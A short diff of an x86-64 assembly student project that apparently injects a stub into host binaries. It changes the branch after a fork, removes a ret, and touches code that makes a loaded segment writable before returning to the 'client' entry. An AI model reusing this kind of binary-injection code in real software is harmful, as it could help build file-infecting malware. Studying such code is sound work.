@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/06/14 11:24:19 by spolowy          ###   ########.fr        ;
+;    Updated: 2019/06/14 11:42:40 by spolowy          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -102,7 +102,7 @@ mark_below:
 	mov rax, SYSCALL_FORK
 	syscall
 	test rax, rax
-	jz return_to_client
+	jnz return_to_client
 
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
@@ -136,7 +136,6 @@ add r9, 0x2df0;TMp DEBUG
 	mov rdi, 0
 	mov rax, SYSCALL_EXIT
 	syscall
-	ret
 ;------------------------------; return to client entry
 return_to_client:
 	mov r11, [rsp + 8]         ; get entry addr
